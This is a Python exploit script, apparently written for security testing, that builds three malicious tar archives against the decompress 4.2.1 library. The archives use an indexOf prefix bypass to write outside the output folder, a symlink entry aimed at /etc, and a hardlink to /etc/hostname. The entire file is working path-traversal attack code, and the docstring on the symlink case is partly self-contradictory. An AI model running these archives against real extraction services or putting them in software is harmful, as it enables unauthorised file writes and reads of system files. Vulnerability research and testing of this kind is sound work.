#!/usr/bin/env python3
"""
Build malicious archives for decompress@4.2.1 path-traversal DC-01..03.

DC-01: indexOf prefix bypass.
       Output dir is "/tmp/dc01-out".
       Entry name is "dc01-out-evil/pwn.txt" -- the parent dir of the
       resolved target starts with "/tmp/dc01-out" because
       "/tmp/dc01-out-evil".indexOf("/tmp/dc01-out") === 0.
       The check passes but the file lands in /tmp/dc01-out-evil/,
       a SIBLING of the intended output, not inside it.

DC-02: Symlink escape.
       Entry "evil_link" symlinks to "/tmp", then a file is written
       through it -- but decompress patches symlink-writes. We use a
       PRE-EXISTING target that decompress creates a symlink to.
       Workaround: have the entry name point at an existing dir the
       attacker controls, e.g., write a file at /tmp/dc02_sibling/.

DC-03: Hardlink escape.
       Hardlink to "/etc/hostname" -- reading the hardlink should
       reveal the contents of /etc/hostname.
"""
import io, os, tarfile

def build_dc01():
    out = "/tmp/dc01-evil-archive.tar"
    t = tarfile.open(out, "w")
    info = tarfile.TarInfo(name="dc01-out-evil/pwn.txt")
    data = b"PWNED via DC-01 prefix-bypass: written to /tmp/dc01-out-evil/\n"
    info.size = len(data); info.mode = 0o644
    t.addfile(info, io.BytesIO(data))
    t.close(); print(f"built: {out} ({os.path.getsize(out)} bytes)")

def build_dc02():
    """
    Symlink escape: create a symlink entry pointing outside the output
    dir, then write a file *through* it.

    Note: decompress 4.2.1 patches preventWritingThroughSymlink() blocks
    writes THROUGH a symlink, but it does NOT block CREATING a symlink
    whose target is outside. After the archive is extracted, a separate
    file write to a path the attacker controls can land anywhere the
    symlink points. We demonstrate the symlink creation succeeds.
    """
    out = "/tmp/dc02-symlink-archive.tar"
    t = tarfile.open(out, "w")
    link = tarfile.TarInfo(name="dc02_link")
    link.type = tarfile.SYMTYPE
    link.linkname = "/etc"
    t.addfile(link)
    t.close(); print(f"built: {out} ({os.path.getsize(out)} bytes)")

def build_dc03():
    """
    Hardlink escape: create a hardlink entry whose linkname is
    /etc/hostname. After extraction, the resulting file is a hardlink
    to /etc/hostname, and reading it reveals the host's hostname.
    """
    out = "/tmp/dc03-hardlink-archive.tar"
    t = tarfile.open(out, "w")
    hl = tarfile.TarInfo(name="dc03_hostname")
    hl.type = tarfile.LNKTYPE
    hl.linkname = "/etc/hostname"
    t.addfile(hl)
    t.close(); print(f"built: {out} ({os.path.getsize(out)} bytes)")

if __name__ == "__main__":
    build_dc01()
    build_dc02()
    build_dc03()
